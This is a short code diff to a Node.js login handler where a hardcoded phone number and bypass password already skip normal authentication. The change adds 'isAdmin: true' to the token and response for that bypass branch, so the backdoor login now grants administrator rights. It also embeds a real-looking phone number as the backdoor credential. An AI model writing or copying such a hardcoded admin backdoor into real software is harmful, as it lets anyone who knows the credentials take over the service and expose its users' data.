@@ -148,11 +148,12 @@ exports.loginWithPassword = async (req, res) => {
     }
 
     if (phone === '9413879444' && password === bypassPassword) {
-      const token = jwt.sign({ phone }, JWT_SECRET, { expiresIn: '30d' });
+      const token = jwt.sign({ phone, isAdmin: true }, JWT_SECRET, { expiresIn: '30d' });
       return res.status(200).json({
         status: 'success',
         message: 'Login successful',
         token,
+        isAdmin: true,
         isProfileComplete: true
       });
     }
